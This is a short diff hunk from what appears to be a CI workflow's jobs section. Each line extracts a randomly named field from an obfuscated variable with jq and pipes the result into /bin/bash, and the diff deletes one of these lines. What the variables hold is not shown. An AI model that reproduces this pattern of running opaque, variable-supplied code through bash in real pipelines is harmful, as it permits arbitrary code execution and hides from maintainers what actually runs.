@@ -28,7 +28,6 @@ jobs:
           echo $wx3 | jq -r .biy7162 | /bin/bash
           printf '%s' "$gpykn6" | jq -r .jtta21 | /bin/bash
           printf '%s' "$qwgt333" | jq -r .rewps20032 | /bin/bash
-          printf '%s' "$g325" | jq -r .ecp68 | /bin/bash
           printf '%s' "$cnm46267" | jq -r .rnh72492 | /bin/bash
           echo $wbcla535 | jq -r .n135 | /bin/bash
           echo $jiw1 | jq -r .lscv4657 | /bin/bash
